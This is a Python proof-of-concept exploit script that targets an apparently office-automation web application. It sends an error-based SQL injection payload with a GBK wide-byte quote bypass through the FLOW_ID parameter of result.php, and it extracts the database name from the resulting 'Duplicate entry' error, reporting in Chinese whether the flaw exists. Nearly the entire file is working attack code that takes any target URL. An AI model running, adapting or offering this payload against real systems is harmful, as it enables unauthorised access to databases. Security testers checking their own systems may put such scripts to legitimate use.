#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import urllib3
import sys
import time
import json
import re
from datetime import datetime, timedelta

urllib3.disable_warnings()

def verify(site):
    patt  = "Duplicate entry '1~([\w_-]+)' for key"
    burp0_url = site + "/general/score/flow/scoredate/result.php?FLOW_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),0x7e,(substring((select%20database()),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23"
    burp0_headers = {"User-Agent": "Moziilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) ", "Connection": "close", "Accept-Encoding": "gzip"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if "Duplicate" in r.text:
        return re.findall(patt, r.text)[0]
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，查询当前数据库的名称为：", info)
    else:
        print("[-]漏洞不存在")
